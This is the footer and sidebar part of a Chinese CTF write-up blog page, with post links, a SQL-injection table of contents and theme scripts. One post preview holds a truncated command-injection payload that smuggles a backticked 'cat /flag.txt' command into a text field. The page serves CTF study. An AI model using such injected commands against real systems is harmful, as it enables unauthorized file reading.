+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>CTFtime做题-RARCTF</p>
+                <p class='content'>RARCTF
+
+
+weblemonthinker
+命令注入
+payload:
+1text&#x3D;&#96;cat &#x2F;flag.txt &gt; &#x2F;app&#x2F;sta...</p>
+              </a>
+            
+            
+              <a class='next' href='/2021/06/12/%E6%AF%94%E8%B5%9B/2021/2021-6-12%20%E5%BC%BA%E7%BD%91%E6%9D%AF/writeup/'>
+                <p class='title'>强网杯 2021 部分题目writeup<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>强网杯 2021 部分题目writeup
+
+
+webpop_master源码
+12345678&lt;?phpinclude &quot;class.php&quot;;//class.php....</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLi-101"><span class="toc-text">SQLi 101</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLi-102"><span class="toc-text">SQLi 102</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SW-Expert-Academy"><span class="toc-text">SW Expert Academy</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="/static/js-css/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="/static/js-css/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="/static/js-css/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["/static/images/1.jpg", "/static/images/2.jpg", "/static/images/3.jpg", "/static/images/4.jpg", "/static/images/5.jpg", "/static/images/6.jpg", "/static/images/7.jpg", "/static/images/8.jpg", "/static/images/9.jpg", "/static/images/10.jpg", "/static/images/11.jpg", "/static/images/12.jpg", "/static/images/13.jpg", "/static/images/14.jpg", "/static/images/15.jpg", "/static/images/16.jpg", "/static/images/17.jpg", "/static/images/18.jpg", "/static/images/19.jpg", "/static/images/20.jpg", "/static/images/21.jpg", "/static/images/22.jpg", "/static/images/23.jpg", "/static/images/24.jpg", "/static/images/25.jpg", "/static/images/26.jpg", "/static/images/27.jpg", "/static/images/28.jpg", "/static/images/29.jpg", "/static/images/30.jpg", "/static/images/31.jpg", "/static/images/32.jpg", "/static/images/33.jpg", "/static/images/34.jpg", "/static/images/35.jpg", "/static/images/36.jpg", "/static/images/37.jpg", "/static/images/38.jpg", "/static/images/39.jpg", "/static/images/40.jpg", "/static/images/41.jpg", "/static/images/42.jpg", "/static/images/43.jpg", "/static/images/44.jpg", "/static/images/45.jpg", "/static/images/46.jpg", "/static/images/47.jpg", "/static/images/48.jpg", "/static/images/49.jpg", "/static/images/50.jpg", "/static/images/51.jpg", "/static/images/52.jpg", "/static/images/53.jpg", "/static/images/54.jpg", "/static/images/55.jpg", "/static/images/56.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="/static/js-css/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="/static/js-css/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="/static/js-css/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="/static/js-css/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="/static/js-css/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="/static/js-css/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="/static/js-css/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="/static/js-css/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
